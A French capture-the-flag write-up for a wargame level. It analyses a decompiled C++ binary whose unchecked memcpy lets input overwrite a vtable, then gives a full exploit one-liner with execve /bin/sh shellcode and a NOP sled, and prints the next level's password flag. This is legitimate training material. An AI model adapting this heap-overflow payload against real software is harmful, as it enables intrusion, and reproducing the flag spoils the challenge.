@@ -1,0 +1,69 @@
+# Level9
+
+## Analyse du binaire
+
+Le programme est écrit en C++ et contient :
+- Une classe `N` avec une vtable
+- Allocation de deux objets de taille 0x6C (108) bytes
+- Une fonction `setAnnotation` qui copie notre input dans le premier objet
+- Un appel virtuel final qui utilise la vtable du deuxième objet
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  N *v3; // ebx
+  N *v4; // ebx
+  N *v6; // [esp+1Ch] [ebp-8h]
+
+  if ( argc <= 1 )
+    _exit(1);
+  v3 = (N *)operator new(0x6Cu);
+  N::N(v3, 5);
+  v6 = v3;
+  v4 = (N *)operator new(0x6Cu);
+  N::N(v4, 6);
+  N::setAnnotation(v6, (char *)argv[1]);
+  return (**(int (__cdecl ***)(N *, N *))v4)(v4, v6);
+}
+
+
+//----- (0804870E) --------------------------------------------------------
+void *__cdecl N::setAnnotation(N *this, char *s)
+{
+  size_t v2; // eax
+
+  v2 = strlen(s);
+  return memcpy((char *)this + 4, s, v2);
+}
+
+```
+
+## Vulnérabilité
+
+- `setAnnotation` utilise `memcpy` sans vérification de taille
+- L'input est copié à offset 4 du premier objet
+- L'appel final utilise la vtable qui peut être écrasée
+
+## Exploitation
+
+1. Structure de l'exploit :
+- Adresse du buffer (où notre shellcode sera copié)
+- Shellcode pour execve("/bin/sh")
+- NOP sled pour remplir l'espace
+- Même adresse pour écraser la vtable du deuxième objet
+
+```bash
+./level9 $(python -c 'print "\x0c\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90" * 83 + "\x0c\xa0\x04\x08"')
+```
+
+Détail du payload :
+- `\x0c\xa0\x04\x08` : Adresse du buffer (0x804a00c)
+- `\x6a\x0b\x58...` : Shellcode (21 bytes)
+- `\x90` * 83 : NOP sled
+- `\x0c\xa0\x04\x08` : Adresse pour écraser la vtable
+
+## Flag
+```
+cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
